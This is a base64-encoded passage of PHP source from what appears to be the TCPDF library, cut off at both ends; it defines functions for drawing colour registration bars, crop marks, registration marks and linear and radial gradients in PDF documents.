ZWdpc3RyYXRpb25CYXIoJHgsICR5LCAkdywgJGgsICR0cmFuc2l0aW9uPXRydWUsICR2ZXJ0aWNhbD1mYWxzZSwgJGNvbG9ycz0nQSxSLEcsQixDLE0sWSxLJykgewoJCWlmIChzdHJwb3MoJGNvbG9ycywgJ0FMTFNQT1QnKSAhPT0gZmFsc2UpIHsKCQkJLy8gZXhwYW5kIHNwb3QgY29sb3JzCgkJCSRzcG90X2NvbG9ycyA9ICcnOwoJCQlmb3JlYWNoICgkdGhpcy0+c3BvdF9jb2xvcnMgYXMgJHNwb3RfY29sb3JfbmFtZSA9PiAkdikgewoJCQkJJHNwb3RfY29sb3JzIC49ICcsJy4kc3BvdF9jb2xvcl9uYW1lOwoJCQl9CgkJCWlmICghZW1wdHkoJHNwb3RfY29sb3JzKSkgewoJCQkJJHNwb3RfY29sb3JzID0gc3Vic3RyKCRzcG90X2NvbG9ycywgMSk7CgkJCQkkY29sb3JzID0gc3RyX3JlcGxhY2UoJ0FMTFNQT1QnLCAkc3BvdF9jb2xvcnMsICRjb2xvcnMpOwoJCQl9IGVsc2UgewoJCQkJJGNvbG9ycyA9IHN0cl9yZXBsYWNlKCdBTExTUE9UJywgJ05PTkUnLCAkY29sb3JzKTsKCQkJfQoJCX0KCQkkYmFycyA9IGV4cGxvZGUoJywnLCAkY29sb3JzKTsKCQkkbnVtYmFycyA9IGNvdW50KCRiYXJzKTsgLy8gbnVtYmVyIG9mIGJhcnMgdG8gcHJpbnQKCQlpZiAoJG51bWJhcnMgPD0gMCkgewoJCQlyZXR1cm47CgkJfQoJCS8vIHNldCBiYXIgbWVhc3VyZXMKCQlpZiAoJHZlcnRpY2FsKSB7CgkJCSRjb29yZHMgPSBhcnJheSgwLCAwLCAwLCAxKTsKCQkJJHdiID0gJHcgLyAkbnVtYmFyczsgLy8gYmFyIHdpZHRoCgkJCSRoYiA9ICRoOyAvLyBiYXIgaGVpZ2h0CgkJCSR4ZCA9ICR3YjsgLy8gZGVsdGEgeAoJCQkkeWQgPSAwOyAvLyBkZWx0YSB5CgkJfSBlbHNlIHsKCQkJJGNvb3JkcyA9IGFycmF5KDEsIDAsIDAsIDApOwoJCQkkd2IgPSAkdzsgLy8gYmFyIHdpZHRoCgkJCSRoYiA9ICRoIC8gJG51bWJhcnM7IC8vIGJhciBoZWlnaHQKCQkJJHhkID0gMDsgLy8gZGVsdGEgeAoJCQkkeWQgPSAkaGI7IC8vIGRlbHRhIHkKCQl9CgkJJHhiID0gJHg7CgkJJHliID0gJHk7CgkJZm9yZWFjaCAoJGJhcnMgYXMgJGNvbCkgewoJCQlzd2l0Y2ggKCRjb2wpIHsKCQkJCS8vIHNldCB0cmFuc2l0aW9uIGNvbG9ycwoJCQkJY2FzZSAnQSc6IHsgLy8gQkxBQ0sgKEdSQVlTQ0FMRSkKCQkJCQkkY29sX2EgPSBhcnJheSgyNTUpOwoJCQkJCSRjb2xfYiA9IGFycmF5KDApOwoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJY2FzZSAnVyc6IHsgLy8gV0hJVEUgKEdSQVlTQ0FMRSkKCQkJCQkkY29sX2EgPSBhcnJheSgwKTsKCQkJCQkkY29sX2IgPSBhcnJheSgyNTUpOwoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJY2FzZSAnUic6IHsgLy8gUkVEIChSR0IpCgkJCQkJJGNvbF9hID0gYXJyYXkoMjU1LDI1NSwyNTUpOwoJCQkJCSRjb2xfYiA9IGFycmF5KDI1NSwwLDApOwoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJY2FzZSAnRyc6IHsgLy8gR1JFRU4gKFJHQikKCQkJCQkkY29sX2EgPSBhcnJheSgyNTUsMjU1LDI1NSk7CgkJCQkJJGNvbF9iID0gYXJyYXkoMCwyNTUsMCk7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCQljYXNlICdCJzogeyAvLyBCTFVFIChSR0IpCgkJCQkJJGNvbF9hID0gYXJyYXkoMjU1LDI1NSwyNTUpOwoJCQkJCSRjb2xfYiA9IGFycmF5KDAsMCwyNTUpOwoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJY2FzZSAnQyc6IHsgLy8gQ1lBTiAoQ01ZSykKCQkJCQkkY29sX2EgPSBhcnJheSgwLDAsMCwwKTsKCQkJCQkkY29sX2IgPSBhcnJheSgxMDAsMCwwLDApOwoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJY2FzZSAnTSc6IHsgLy8gTUFHRU5UQSAoQ01ZSykKCQkJCQkkY29sX2EgPSBhcnJheSgwLDAsMCwwKTsKCQkJCQkkY29sX2IgPSBhcnJheSgwLDEwMCwwLDApOwoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJY2FzZSAnWSc6IHsgLy8gWUVMTE9XIChDTVlLKQoJCQkJCSRjb2xfYSA9IGFycmF5KDAsMCwwLDApOwoJCQkJCSRjb2xfYiA9IGFycmF5KDAsMCwxMDAsMCk7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCQljYXNlICdLJzogeyAvLyBLRVkgLSBCTEFDSyAoQ01ZSykKCQkJCQkkY29sX2EgPSBhcnJheSgwLDAsMCwwKTsKCQkJCQkkY29sX2IgPSBhcnJheSgwLDAsMCwxMDApOwoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJY2FzZSAnUkdCJzogeyAvLyBCTEFDSyBSRUdJU1RSQVRJT04gKFJHQikKCQkJCQkkY29sX2EgPSBhcnJheSgyNTUsMjU1LDI1NSk7CgkJCQkJJGNvbF9iID0gYXJyYXkoMCwwLDApOwoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJY2FzZSAnQ01ZSyc6IHsgLy8gQkxBQ0sgUkVHSVNUUkFUSU9OIChDTVlLKQoJCQkJCSRjb2xfYSA9IGFycmF5KDAsMCwwLDApOwoJCQkJCSRjb2xfYiA9IGFycmF5KDEwMCwxMDAsMTAwLDEwMCk7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCQljYXNlICdBTEwnOiB7IC8vIFNQT1QgQ09MT1IgUkVHSVNUUkFUSU9OCgkJCQkJJGNvbF9hID0gYXJyYXkoMCwwLDAsMCwnTm9uZScpOwoJCQkJCSRjb2xfYiA9IGFycmF5KDEwMCwxMDAsMTAwLDEwMCwnQWxsJyk7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCQljYXNlICdOT05FJzogeyAvLyBTS0lQIFRISVMgQ09MT1IKCQkJCQkkY29sX2EgPSBhcnJheSgwLDAsMCwwLCdOb25lJyk7CgkJCQkJJGNvbF9iID0gYXJyYXkoMCwwLDAsMCwnTm9uZScpOwoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJZGVmYXVsdDogeyAvLyBTUEVDSUZJQyBTUE9UIENPTE9SIE5BTUUKCQkJCQkkY29sX2EgPSBhcnJheSgwLDAsMCwwLCdOb25lJyk7CgkJCQkJJGNvbF9iID0gVENQREZfQ09MT1JTOjpnZXRTcG90Q29sb3IoJGNvbCwgJHRoaXMtPnNwb3RfY29sb3JzKTsKCQkJCQlpZiAoJGNvbF9iID09PSBmYWxzZSkgewoJCQkJCQkvLyBpbiBjYXNlIG9mIGVycm9yIGRlZmF1bHRzIHRvIHRoZSByZWdpc3RyYXRpb24gY29sb3IKCQkJCQkJJGNvbF9iID0gYXJyYXkoMTAwLDEwMCwxMDAsMTAwLCdBbGwnKTsKCQkJCQl9CgkJCQkJYnJlYWs7CgkJCQl9CgkJCX0KCQkJaWYgKCRjb2wgIT0gJ05PTkUnKSB7CgkJCQlpZiAoJHRyYW5zaXRpb24pIHsKCQkJCQkvLyBjb2xvciBncmFkaWVudAoJCQkJCSR0aGlzLT5MaW5lYXJHcmFkaWVudCgkeGIsICR5YiwgJHdiLCAkaGIsICRjb2xfYSwgJGNvbF9iLCAkY29vcmRzKTsKCQkJCX0gZWxzZSB7CgkJCQkJJHRoaXMtPnNldEZpbGxDb2xvckFycmF5KCRjb2xfYik7CgkJCQkJLy8gY29sb3JlZCByZWN0YW5nbGUKCQkJCQkkdGhpcy0+UmVjdCgkeGIsICR5YiwgJHdiLCAkaGIsICdGJywgYXJyYXkoKSk7CgkJCQl9CgkJCQkkeGIgKz0gJHhkOwoJCQkJJHliICs9ICR5ZDsKCQkJfQoJCX0KCX0KCgkvKioKCSAqIFBhaW50cyBjcm9wIG1hcmtzLgoJICogQHBhcmFtIGZsb2F0ICR4IGFic2Npc3NhIG9mIHRoZSBjcm9wIG1hcmsgY2VudGVyLgoJICogQHBhcmFtIGZsb2F0ICR5IG9yZGluYXRlIG9mIHRoZSBjcm9wIG1hcmsgY2VudGVyLgoJICogQHBhcmFtIGZsb2F0ICR3IHdpZHRoIG9mIHRoZSBjcm9wIG1hcmsuCgkgKiBAcGFyYW0gZmxvYXQgJGggaGVpZ2h0IG9mIHRoZSBjcm9wIG1hcmsuCgkgKiBAcGFyYW0gc3RyaW5nICR0eXBlIHR5cGUgb2YgY3JvcCBtYXJrLCBvbmUgc3ltYm9sIHBlciB0eXBlIHNlcGFyYXRlZCBieSBjb21tYTogVCA9IFRPUCwgRiA9IEJPVFRPTSwgTCA9IExFRlQsIFIgPSBSSUdIVCwgVEwgPSBBID0gVE9QLUxFRlQsIFRSID0gQiA9IFRPUC1SSUdIVCwgQkwgPSBDID0gQk9UVE9NLUxFRlQsIEJSID0gRCA9IEJPVFRPTS1SSUdIVC4KCSAqIEBwYXJhbSBhcnJheSAkY29sb3IgY3JvcCBtYXJrIGNvbG9yIChkZWZhdWx0IHNwb3QgcmVnaXN0cmF0aW9uIGNvbG9yKS4KCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgNC45LjAwMCAoMjAxMC0wMy0yNikKCSAqIEBwdWJsaWMKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGNyb3BNYXJrKCR4LCAkeSwgJHcsICRoLCAkdHlwZT0nVCxSLEIsTCcsICRjb2xvcj1hcnJheSgxMDAsMTAwLDEwMCwxMDAsJ0FsbCcpKSB7CgkJJHRoaXMtPnNldExpbmVTdHlsZShhcnJheSgnd2lkdGgnID0+ICgwLjUgLyAkdGhpcy0+ayksICdjYXAnID0+ICdidXR0JywgJ2pvaW4nID0+ICdtaXRlcicsICdkYXNoJyA9PiAwLCAnY29sb3InID0+ICRjb2xvcikpOwoJCSR0eXBlID0gc3RydG91cHBlcigkdHlwZSk7CgkJJHR5cGUgPSBwcmVnX3JlcGxhY2UoJy9bXkEtWlwtXCxdKi8nLCAnJywgJHR5cGUpOwoJCS8vIHNwbGl0IHR5cGUgaW4gc2luZ2xlIGNvbXBvbmVudHMKCQkkdHlwZSA9IHN0cl9yZXBsYWNlKCctJywgJywnLCAkdHlwZSk7CgkJJHR5cGUgPSBzdHJfcmVwbGFjZSgnVEwnLCAnVCxMJywgJHR5cGUpOwoJCSR0eXBlID0gc3RyX3JlcGxhY2UoJ1RSJywgJ1QsUicsICR0eXBlKTsKCQkkdHlwZSA9IHN0cl9yZXBsYWNlKCdCTCcsICdGLEwnLCAkdHlwZSk7CgkJJHR5cGUgPSBzdHJfcmVwbGFjZSgnQlInLCAnRixSJywgJHR5cGUpOwoJCSR0eXBlID0gc3RyX3JlcGxhY2UoJ0EnLCAnVCxMJywgJHR5cGUpOwoJCSR0eXBlID0gc3RyX3JlcGxhY2UoJ0InLCAnVCxSJywgJHR5cGUpOwoJCSR0eXBlID0gc3RyX3JlcGxhY2UoJ1QsUk8nLCAnQk8nLCAkdHlwZSk7CgkJJHR5cGUgPSBzdHJfcmVwbGFjZSgnQycsICdGLEwnLCAkdHlwZSk7CgkJJHR5cGUgPSBzdHJfcmVwbGFjZSgnRCcsICdGLFInLCAkdHlwZSk7CgkJJGNyb3BzID0gZXhwbG9kZSgnLCcsIHN0cnRvdXBwZXIoJHR5cGUpKTsKCQkvLyByZW1vdmUgZHVwbGljYXRlcwoJCSRjcm9wcyA9IGFycmF5X3VuaXF1ZSgkY3JvcHMpOwoJCSRkdyA9ICgkdyAvIDQpOyAvLyBob3Jpem9udGFsIHNwYWNlIHRvIGxlYXZlIGJlZm9yZSB0aGUgaW50ZXJzZWN0aW9uIHBvaW50CgkJJGRoID0gKCRoIC8gNCk7IC8vIHZlcnRpY2FsIHNwYWNlIHRvIGxlYXZlIGJlZm9yZSB0aGUgaW50ZXJzZWN0aW9uIHBvaW50CgkJZm9yZWFjaCAoJGNyb3BzIGFzICRjcm9wKSB7CgkJCXN3aXRjaCAoJGNyb3ApIHsKCQkJCWNhc2UgJ1QnOgoJCQkJY2FzZSAnVE9QJzogewoJCQkJCSR4MSA9ICR4OwoJCQkJCSR5MSA9ICgkeSAtICRoKTsKCQkJCQkkeDIgPSAkeDsKCQkJCQkkeTIgPSAoJHkgLSAkZGgpOwoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJY2FzZSAnRic6CgkJCQljYXNlICdCT1RUT00nOiB7CgkJCQkJJHgxID0gJHg7CgkJCQkJJHkxID0gKCR5ICsgJGRoKTsKCQkJCQkkeDIgPSAkeDsKCQkJCQkkeTIgPSAoJHkgKyAkaCk7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCQljYXNlICdMJzoKCQkJCWNhc2UgJ0xFRlQnOiB7CgkJCQkJJHgxID0gKCR4IC0gJHcpOwoJCQkJCSR5MSA9ICR5OwoJCQkJCSR4MiA9ICgkeCAtICRkdyk7CgkJCQkJJHkyID0gJHk7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCQljYXNlICdSJzoKCQkJCWNhc2UgJ1JJR0hUJzogewoJCQkJCSR4MSA9ICgkeCArICRkdyk7CgkJCQkJJHkxID0gJHk7CgkJCQkJJHgyID0gKCR4ICsgJHcpOwoJCQkJCSR5MiA9ICR5OwoJCQkJCWJyZWFrOwoJCQkJfQoJCQl9CgkJCSR0aGlzLT5MaW5lKCR4MSwgJHkxLCAkeDIsICR5Mik7CgkJfQoJfQoKCS8qKgoJICogUGFpbnRzIGEgcmVnaXN0cmF0aW9uIG1hcmsKCSAqIEBwYXJhbSBmbG9hdCAkeCBhYnNjaXNzYSBvZiB0aGUgcmVnaXN0cmF0aW9uIG1hcmsgY2VudGVyLgoJICogQHBhcmFtIGZsb2F0ICR5IG9yZGluYXRlIG9mIHRoZSByZWdpc3RyYXRpb24gbWFyayBjZW50ZXIuCgkgKiBAcGFyYW0gZmxvYXQgJHIgcmFkaXVzIG9mIHRoZSBjcm9wIG1hcmsuCgkgKiBAcGFyYW0gYm9vbGVhbiAkZG91YmxlIGlmIHRydWUgcHJpbnQgdHdvIGNvbmNlbnRyaWMgY3JvcCBtYXJrcy4KCSAqIEBwYXJhbSBhcnJheSAkY29sYSBjcm9wIG1hcmsgY29sb3IgKGRlZmF1bHQgc3BvdCByZWdpc3RyYXRpb24gY29sb3IgJ0FsbCcpLgoJICogQHBhcmFtIGFycmF5ICRjb2xiIHNlY29uZCBjcm9wIG1hcmsgY29sb3IgKGRlZmF1bHQgc3BvdCByZWdpc3RyYXRpb24gY29sb3IgJ05vbmUnKS4KCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgNC45LjAwMCAoMjAxMC0wMy0yNikKCSAqIEBwdWJsaWMKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHJlZ2lzdHJhdGlvbk1hcmsoJHgsICR5LCAkciwgJGRvdWJsZT1mYWxzZSwgJGNvbGE9YXJyYXkoMTAwLDEwMCwxMDAsMTAwLCdBbGwnKSwgJGNvbGI9YXJyYXkoMCwwLDAsMCwnTm9uZScpKSB7CgkJJGxpbmVfc3R5bGUgPSBhcnJheSgnd2lkdGgnID0+IG1heCgoMC41IC8gJHRoaXMtPmspLCgkciAvIDMwKSksICdjYXAnID0+ICdidXR0JywgJ2pvaW4nID0+ICdtaXRlcicsICdkYXNoJyA9PiAwLCAnY29sb3InID0+ICRjb2xhKTsKCQkkdGhpcy0+c2V0RmlsbENvbG9yQXJyYXkoJGNvbGEpOwoJCSR0aGlzLT5QaWVTZWN0b3IoJHgsICR5LCAkciwgOTAsIDE4MCwgJ0YnKTsKCQkkdGhpcy0+UGllU2VjdG9yKCR4LCAkeSwgJHIsIDI3MCwgMzYwLCAnRicpOwoJCSR0aGlzLT5DaXJjbGUoJHgsICR5LCAkciwgMCwgMzYwLCAnQycsICRsaW5lX3N0eWxlLCBhcnJheSgpLCA4KTsKCQlpZiAoJGRvdWJsZSkgewoJCQkkcmkgPSAkciAqIDAuNTsKCQkJJHRoaXMtPnNldEZpbGxDb2xvckFycmF5KCRjb2xiKTsKCQkJJHRoaXMtPlBpZVNlY3RvcigkeCwgJHksICRyaSwgOTAsIDE4MCwgJ0YnKTsKCQkJJHRoaXMtPlBpZVNlY3RvcigkeCwgJHksICRyaSwgMjcwLCAzNjAsICdGJyk7CgkJCSR0aGlzLT5zZXRGaWxsQ29sb3JBcnJheSgkY29sYSk7CgkJCSR0aGlzLT5QaWVTZWN0b3IoJHgsICR5LCAkcmksIDAsIDkwLCAnRicpOwoJCQkkdGhpcy0+UGllU2VjdG9yKCR4LCAkeSwgJHJpLCAxODAsIDI3MCwgJ0YnKTsKCQkJJHRoaXMtPkNpcmNsZSgkeCwgJHksICRyaSwgMCwgMzYwLCAnQycsICRsaW5lX3N0eWxlLCBhcnJheSgpLCA4KTsKCQl9Cgl9CgoJLyoqCgkgKiBQYWludHMgYSBDTVlLIHJlZ2lzdHJhdGlvbiBtYXJrCgkgKiBAcGFyYW0gZmxvYXQgJHggYWJzY2lzc2Egb2YgdGhlIHJlZ2lzdHJhdGlvbiBtYXJrIGNlbnRlci4KCSAqIEBwYXJhbSBmbG9hdCAkeSBvcmRpbmF0ZSBvZiB0aGUgcmVnaXN0cmF0aW9uIG1hcmsgY2VudGVyLgoJICogQHBhcmFtIGZsb2F0ICRyIHJhZGl1cyBvZiB0aGUgY3JvcCBtYXJrLgoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBzaW5jZSA2LjAuMDM4ICgyMDEzLTA5LTMwKQoJICogQHB1YmxpYwoJICovCglwdWJsaWMgZnVuY3Rpb24gcmVnaXN0cmF0aW9uTWFya0NNWUsoJHgsICR5LCAkcikgewoJCS8vIGxpbmUgd2lkdGgKCQkkbHcgPSBtYXgoKDAuNSAvICR0aGlzLT5rKSwoJHIgLyA4KSk7CgkJLy8gaW50ZXJuYWwgcmFkaXVzCgkJJHJpID0gKCRyICogMC42KTsKCQkvLyBleHRlcm5hbCByYWRpdXMKCQkkcmUgPSAoJHIgKiAxLjMpOwoJCS8vIEN5YW4KCQkkdGhpcy0+c2V0RmlsbENvbG9yQXJyYXkoYXJyYXkoMTAwLDAsMCwwKSk7CgkJJHRoaXMtPlBpZVNlY3RvcigkeCwgJHksICRyaSwgMjcwLCAzNjAsICdGJyk7CgkJLy8gTWFnZW50YQoJCSR0aGlzLT5zZXRGaWxsQ29sb3JBcnJheShhcnJheSgwLDEwMCwwLDApKTsKCQkkdGhpcy0+UGllU2VjdG9yKCR4LCAkeSwgJHJpLCAwLCA5MCwgJ0YnKTsKCQkvLyBZZWxsb3cKCQkkdGhpcy0+c2V0RmlsbENvbG9yQXJyYXkoYXJyYXkoMCwwLDEwMCwwKSk7CgkJJHRoaXMtPlBpZVNlY3RvcigkeCwgJHksICRyaSwgOTAsIDE4MCwgJ0YnKTsKCQkvLyBLZXkgLSBibGFjawoJCSR0aGlzLT5zZXRGaWxsQ29sb3JBcnJheShhcnJheSgwLDAsMCwxMDApKTsKCQkkdGhpcy0+UGllU2VjdG9yKCR4LCAkeSwgJHJpLCAxODAsIDI3MCwgJ0YnKTsKCQkvLyByZWdpc3RyYXRpb24gY29sb3IKCQkkbGluZV9zdHlsZSA9IGFycmF5KCd3aWR0aCcgPT4gJGx3LCAnY2FwJyA9PiAnYnV0dCcsICdqb2luJyA9PiAnbWl0ZXInLCAnZGFzaCcgPT4gMCwgJ2NvbG9yJyA9PiBhcnJheSgxMDAsMTAwLDEwMCwxMDAsJ0FsbCcpKTsKCQkkdGhpcy0+c2V0RmlsbENvbG9yQXJyYXkoYXJyYXkoMTAwLDEwMCwxMDAsMTAwLCdBbGwnKSk7CgkJLy8gZXh0ZXJuYWwgY2lyY2xlCgkJJHRoaXMtPkNpcmNsZSgkeCwgJHksICRyLCAwLCAzNjAsICdDJywgJGxpbmVfc3R5bGUsIGFycmF5KCksIDgpOwoJCS8vIGNyb3NzIGxpbmVzCgkJJHRoaXMtPkxpbmUoJHgsICgkeSAtICRyZSksICR4LCAoJHkgLSAkcmkpKTsKCQkkdGhpcy0+TGluZSgkeCwgKCR5ICsgJHJpKSwgJHgsICgkeSArICRyZSkpOwoJCSR0aGlzLT5MaW5lKCgkeCAtICRyZSksICR5LCAoJHggLSAkcmkpLCAkeSk7CgkJJHRoaXMtPkxpbmUoKCR4ICsgJHJpKSwgJHksICgkeCArICRyZSksICR5KTsKCX0KCgkvKioKCSAqIFBhaW50cyBhIGxpbmVhciBjb2xvdXIgZ3JhZGllbnQuCgkgKiBAcGFyYW0gZmxvYXQgJHggYWJzY2lzc2Egb2YgdGhlIHRvcCBsZWZ0IGNvcm5lciBvZiB0aGUgcmVjdGFuZ2xlLgoJICogQHBhcmFtIGZsb2F0ICR5IG9yZGluYXRlIG9mIHRoZSB0b3AgbGVmdCBjb3JuZXIgb2YgdGhlIHJlY3RhbmdsZS4KCSAqIEBwYXJhbSBmbG9hdCAkdyB3aWR0aCBvZiB0aGUgcmVjdGFuZ2xlLgoJICogQHBhcmFtIGZsb2F0ICRoIGhlaWdodCBvZiB0aGUgcmVjdGFuZ2xlLgoJICogQHBhcmFtIGFycmF5ICRjb2wxIGZpcnN0IGNvbG9yIChHcmF5c2NhbGUsIFJHQiBvciBDTVlLIGNvbXBvbmVudHMpLgoJICogQHBhcmFtIGFycmF5ICRjb2wyIHNlY29uZCBjb2xvciAoR3JheXNjYWxlLCBSR0Igb3IgQ01ZSyBjb21wb25lbnRzKS4KCSAqIEBwYXJhbSBhcnJheSAkY29vcmRzIGFycmF5IG9mIHRoZSBmb3JtICh4MSwgeTEsIHgyLCB5Mikgd2hpY2ggZGVmaW5lcyB0aGUgZ3JhZGllbnQgdmVjdG9yIChzZWUgbGluZWFyX2dyYWRpZW50X2Nvb3Jkcy5qcGcpLiBUaGUgZGVmYXVsdCB2YWx1ZSBpcyBmcm9tIGxlZnQgdG8gcmlnaHQgKHgxPTAsIHkxPTAsIHgyPTEsIHkyPTApLgoJICogQGF1dGhvciBBbmRyZWFzIFdcRkNybXNlciwgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgMy4xLjAwMCAoMjAwOC0wNi0wOSkKCSAqIEBwdWJsaWMKCSAqLwoJcHVibGljIGZ1bmN0aW9uIExpbmVhckdyYWRpZW50KCR4LCAkeSwgJHcsICRoLCAkY29sMT1hcnJheSgpLCAkY29sMj1hcnJheSgpLCAkY29vcmRzPWFycmF5KDAsMCwxLDApKSB7CgkJJHRoaXMtPkNsaXAoJHgsICR5LCAkdywgJGgpOwoJCSR0aGlzLT5HcmFkaWVudCgyLCAkY29vcmRzLCBhcnJheShhcnJheSgnY29sb3InID0+ICRjb2wxLCAnb2Zmc2V0JyA9PiAwLCAnZXhwb25lbnQnID0+IDEpLCBhcnJheSgnY29sb3InID0+ICRjb2wyLCAnb2Zmc2V0JyA9PiAxLCAnZXhwb25lbnQnID0+IDEpKSwgYXJyYXkoKSwgZmFsc2UpOwoJfQoKCS8qKgoJICogUGFpbnRzIGEgcmFkaWFsIGNvbG91ciBncmFkaWVudC4KCSAqIEBwYXJhbSBmbG9hdCAkeCBhYnNjaXNzYSBvZiB0aGUgdG9wIGxlZnQgY29ybmVyIG9mIHRoZSByZWN0YW5nbGUuCgkgKiBAcGFyYW0gZmxvYXQgJHkgb3JkaW5hdGUgb2YgdGhlIHRvcCBsZWZ0IGNvcm5lciBvZiB0aGUgcmVjdGFuZ2xlLgoJICogQHBhcmFtIGZsb2F0ICR3IHdpZHRoIG9mIHRoZSByZWN0YW5nbGUuCgkgKiBAcGFyYW0gZmxvYXQgJGggaGVpZ2h0IG9mIHRoZSByZWN0YW5nbGUuCgkgKiBAcGFyYW0gYXJyYXkgJGNvbDEgZmlyc3QgY29sb3IgKEdyYXlzY2FsZSwgUkdCIG9yIENNWUsgY29tcG9uZW50cykuCgkgKiBAcGFyYW0gYXJyYXkgJGNvbDIgc2Vjb25kIGNvbG9yIChHcmF5c2NhbGUsIFJHQiBvciBDTVlLIGNvbXBvbmVudHMpLgoJICogQHBhcmFtIGFycmF5ICRjb29yZHMgYXJyYXkgb2YgdGhlIGZvcm0gKGZ4LCBmeSwgY3gsIGN5LCByKSB3aGVyZSAoZngsIGZ5KSBpcyB0aGUgc3RhcnRpbmcgcG9pbnQgb2YgdGhlIGdyYWRpZW50IHdpdGggY29sb3IxLCAoY3gsIGN5KSBpcyB0aGUgY2VudGVyIG9mIHRoZSBjaXJjbGUgd2l0aCBjb2xvcjIsIGFuZCByIGlzIHRoZSByYWRpdXMgb2YgdGhlIGNpcmNsZSAoc2VlIHJhZGlhbF9ncmFkaWVudF9jb29yZHMuanBnKS4gKGZ4LCBmeSkgc2hvdWxkIGJlIGluc2lkZSB0aGUgY2lyY2xlLCBvdGhlcndpc2Ugc29tZSBhcmVhcyB3aWxsIG5vdCBiZSBkZWZpbmVkLgoJICogQGF1dGhvciBBbmRyZWFzIFdcRkNybXNlciwgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgMy4xLjAwMCAoMjAwOC0wNi0wOSkKCSAqIEBwdWJsaWMKCSAqLwoJcHVibGljIGZ1bmN0aW9uIFJhZGlhbEdyYWRpZW50KCR4LCAkeSwgJHcsICRoLCAkY29sMT1hcnJheSgpLCAkY29sMj1hcnJheSgpLCAkY29vcmRzPWFycmF5KDAuNSwwLjUsMC41LDAuNSwxKSkgewoJCSR0aGlzLT5DbGlwKCR4LCAkeSwgJHcsICRoKTsKCQkkdGhpcy0+R3JhZGllbnQoMywgJGNvb3JkcywgYXJyYXkoYXJyYXkoJ2NvbG9yJyA9PiAkY29sMSwgJ29mZnNldCcgPT4gMCwgJ2V4cG9uZW50JyA9PiAxKSwgYXJyYXkoJ2NvbG9yJyA9PiAkY29sMiwgJ29mZnNldCcgPT4gMSwgJ2V4cG9uZW50JyA9PiAxKSksIGFycmF5KCksIGZhbHNlKTsKCX0KCgkvKioKCSAqIFBhaW50cyBhIGNvb25zIHBhdGNoIG1lc2guCgkgKiBAcGFyYW0gZmxvYXQgJHggYWJzY2lzc2Egb2YgdGhlIHRvcCBsZWZ0IGNvcm5lciBvZiB0aGUgcmVjdGFuZ2xlLgoJICogQHBhcmFtIGZsb2F0ICR5IG9yZGluYXRlIG9mIHRoZSB0b3AgbGVmdCBjb3JuZXIgb2YgdGhlIHJlY3RhbmdsZS4KCSAqIEBwYXJhbSBmbG9hdCAkdyB3aWR0aCBvZiB0aGUgcmVjdGFuZ2xlLgoJICogQHBhcmFtIGZsb2F0ICRoIGhlaWdodCBvZiB0aGUgcmVjdGFuZ2xlLgoJICogQHBhcmFtIGFycmF5ICRjb2wxIGZpcnN0IGNvbG9yIChsb3dlciBsZWZ0IGNvcm5lcikgKFJHQiBjb21wb25lbnRzKS4KCSAqIEBwYXJhbSBhcnJheSAkY29sMiBzZWNvbmQgY29sb3IgKGxvd2VyIHJpZ2h0IGNvcm5lcikgKFJHQiBjb21wb25lbnRzKS4KCSAqIEBwYXJhbSBhcnJheSAkY29sMyB0aGlyZCBjb2xvciAodXBwZXIgcmlnaHQgY29ybmVyKSAoUkdCIGNvbXBvbmVudHMpLgoJICogQHBhcmFtIGFycmF5ICRjb2w0IGZvdXJ0aCBjb2xvciAodXBwZXIgbGVmdCBjb3JuZXIpIChSR0IgY29tcG9uZW50cykuCgkgKiBAcGFyYW0gYXJyYXkgJGNvb3JkcyA8dWw+PGxpPmZvciBvbmUgcGF0Y2ggbWVzaDogYXJyYXkoZmxvYXQgeDEsIGZsb2F0IHkxLCAuLi4uIGZsb2F0IHgxMiwgZmxvYXQgeTEyKTogMTIgcGFpcnMgb2YgY29vcmRpbmF0ZXMgKG5vcm1hbGx5IGZyb20gMCB0byAxKSB3aGljaCBzcGVjaWZ5IHRoZSBCZXppZXIgY29udHJvbCBwb2ludHMgdGhhdCBkZWZpbmUgdGhlIHBhdGNoLiBGaXJzdCBwYWlyIGlzIHRoZSBsb3dlciBsZWZ0IGVkZ2UgcG9pbnQsIG5leHQgaXMgaXRzIHJpZ2h0IGNvbnRyb2wgcG9pbnQgKGNvbnRyb2wgcG9pbnQgMikuIFRoZW4gdGhlIG90aGVyIHBvaW50cyBhcmUgZGVmaW5lZCBpbiB0aGUgb3JkZXI6IGNvbnRyb2wgcG9pbnQgMSwgZWRnZSBwb2ludCwgY29udHJvbCBwb2ludCAyIGdvaW5nIGNvdW50ZXItY2xvY2t3aXNlIGFyb3VuZCB0aGUgcGF0Y2guIExhc3QgKHgxMiwgeTEyKSBpcyB0aGUgZmlyc3QgZWRnZSBwb2ludCdzIGxlZnQgY29udHJvbCBwb2ludCAoY29udHJvbCBwb2ludCAxKS48L2xpPjxsaT5mb3IgdHdvIG9yIG1vcmUgcGF0Y2ggbWVzaGVzOiBhcnJheVtudW1iZXIgb2YgcGF0Y2hlc106IGFycmF5cyB3aXRoIHRoZSBmb2xsb3dpbmcga2V5cyBmb3IgZWFjaCBwYXRjaDogZjogd2hlcmUgdG8gcHV0IHRoYXQgcGF0Y2ggKDAgPSBmaXJzdCBwYXRjaCwgMSwgMiwgMyA9IHJpZ2h0LCB0b3AgYW5kIGxlZnQgb2YgcHJlY2VkZW50IHBhdGNoIC0gSSBkaWRuJ3QgZmlndXJlIHRoaXMg